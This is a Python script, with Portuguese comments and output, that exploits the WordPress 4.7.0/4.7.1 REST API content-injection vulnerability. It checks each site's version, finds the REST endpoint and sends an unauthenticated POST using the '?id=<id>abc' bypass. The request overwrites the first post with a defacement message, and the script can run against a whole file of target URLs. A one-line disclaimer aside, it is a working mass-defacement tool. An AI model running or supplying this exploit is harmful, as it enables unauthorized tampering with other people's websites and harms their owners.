#!/usr/bin/env python3
# Exploit WordPress 4.7.0 / 4.7.1 REST API Content Injection
# Autor: Marcos R - 2025
# Uso educativo e autorizado apenas.

import sys
import json
import re
import os
import urllib.request
import urllib.error

try:
    from lxml import etree
except ImportError:
    print("[!] Erro: biblioteca 'lxml' não instalada. Use: pip install lxml")
    sys.exit(1)

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    RESET = Style.RESET_ALL
except ImportError:
    GREEN = RED = YELLOW = CYAN = RESET = ''


def banner():
    print(f"""{CYAN}
  __          ___           _                     _____   ____  
  \\ \\        / (_)         | |                   |  __ \\ / __ \\ 
   \\ \\  /\\  / / _ _ __   __| | ___  ___ ___ ___  | |__) | |  | |
    \\ \\/  \\/ / | | '_ \\ / _` |/ _ \\/ __/ __/ _ \\ |  ___/| |  | |
     \\  /\\  /  | | | | | (_| |  __/\\__ \\__ \\  __/ | |    | |__| |
      \\/  \\/   |_|_| |_|\\__,_|\\___||___/___/\\___| |_|     \\____/ 
           WordPress 4.7.0 / 4.7.1 REST API Exploit
               Auto-scanner + Auto-exploit
                 by {YELLOW}Marcos R{RESET}
    """)


def get_api_url(wordpress_url):
    try:
        response = urllib.request.urlopen(wordpress_url)
        data = etree.HTML(response.read())
        u = data.xpath('//link[@rel="https://api.w.org/"]/@href')[0]
        return u
    except Exception as e:
        print(f"{RED}[!] Erro ao descobrir API em {wordpress_url}: {e}{RESET}")
        return None


def is_vulnerable(wordpress_url):
    try:
        response = urllib.request.urlopen(wordpress_url)
        html = response.read().decode()
        version = re.search(r'content="WordPress ([0-9.]+)"', html)
        if version:
            v = version.group(1)
            print(f"{YELLOW}[+] WordPress detectado em {wordpress_url}: versão {v}{RESET}")
            return v in ["4.7.0", "4.7.1"]
        else:
            print(f"{RED}[!] Versão do WordPress não detectada no HTML em {wordpress_url}{RESET}")
            return False
    except Exception as e:
        print(f"{RED}[!] Falha ao verificar vulnerabilidade em {wordpress_url}: {e}{RESET}")
        return False


def get_first_post(api_base, wordpress_url):
    try:
        response = urllib.request.urlopen(api_base + 'wp/v2/posts')
        posts = json.loads(response.read().decode('utf-8'))
        if posts:
            post = posts[0]
            print(f"{GREEN}[+] Post encontrado em {wordpress_url}: ID {post['id']}, título \"{post['title']['rendered']}\"{RESET}")
            return post['id'], post['link']
        else:
            print(f"{RED}[!] Nenhum post encontrado em {wordpress_url}{RESET}")
            return None, None
    except Exception as e:
        print(f"{RED}[!] Erro ao obter posts em {wordpress_url}: {e}{RESET}")
        return None, None


def update_post(api_base, post_id, new_content, wordpress_url):
    data = json.dumps({
        'content': new_content
    }).encode('utf-8')

    url = api_base + f'wp/v2/posts/{post_id}/?id={post_id}abc'
    req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}, method='POST')

    try:
        response = urllib.request.urlopen(req).read()
        result = json.loads(response.decode('utf-8'))
        print(f"{GREEN}[✓] Post atualizado com sucesso em {wordpress_url}: {result['link']}{RESET}")
        return True
    except urllib.error.HTTPError as e:
        print(f"{RED}[!] Erro HTTP ao atualizar o post em {wordpress_url}: {e.code} - {e.reason}{RESET}")
        print(e.read().decode())
        return False


def process_site(url):
    url = url.strip().rstrip('/')
    if not url.startswith("http"):
        url = "http://" + url

    print(f"{CYAN}\n[*] Processando {url}{RESET}")
    if is_vulnerable(url):
        print(f"{GREEN}[+] {url} é vulnerável! Prosseguindo com exploração...{RESET}")
        api_url = get_api_url(url)
        if not api_url:
            print(f"{RED}[!] Não foi possível descobrir API REST em {url}, pulando.{RESET}")
            return False

        post_id, post_link = get_first_post(api_url, url)
        if post_id:
            sucesso = update_post(api_url, post_id, "<h1>Explorado com sucesso por Marcos R</h1>", url)
            return sucesso
        else:
            print(f"{RED}[!] Nenhum post para editar em {url}{RESET}")
            return False
    else:
        print(f"{RED}[-] {url} NÃO é vulnerável (versão diferente de 4.7.0 ou 4.7.1){RESET}")
        return False


def main():
    banner()

    if len(sys.argv) != 2:
        print(f"{YELLOW}Uso: python3 wp.py <url_única | arquivo_com_urls.txt>{RESET}")
        print(f"{YELLOW}Você pode passar uma URL única ou um arquivo com uma URL por linha.{RESET}")
        sys.exit(1)

    entrada = sys.argv[1]

    if os.path.isfile(entrada):
        # arquivo com URLs
        try:
            with open(entrada, 'r') as f:
                sites = f.readlines()
        except Exception as e:
            print(f"{RED}[!] Erro ao abrir arquivo {entrada}: {e}{RESET}")
            sys.exit(1)

        total = len(sites)
        sucesso = 0

        print(f"{CYAN}[*] Iniciando o scan e autoexploit em {total} sites...{RESET}")

        for site in sites:
            if process_site(site):
                sucesso += 1

        print(f"\n{GREEN}[✓] Processamento finalizado!{RESET}")
        print(f"Total de sites: {total}")
        print(f"Sites explorados com sucesso: {sucesso}")
        print(f"Sites não vulneráveis ou com erro: {total - sucesso}")

    else:
        # uma única URL
        if process_site(entrada):
            print(f"{GREEN}[✓] Exploração realizada com sucesso para {entrada}{RESET}")
        else:
            print(f"{RED}[-] Falha ou site não vulnerável: {entrada}{RESET}")


if __name__ == '__main__':
    main()
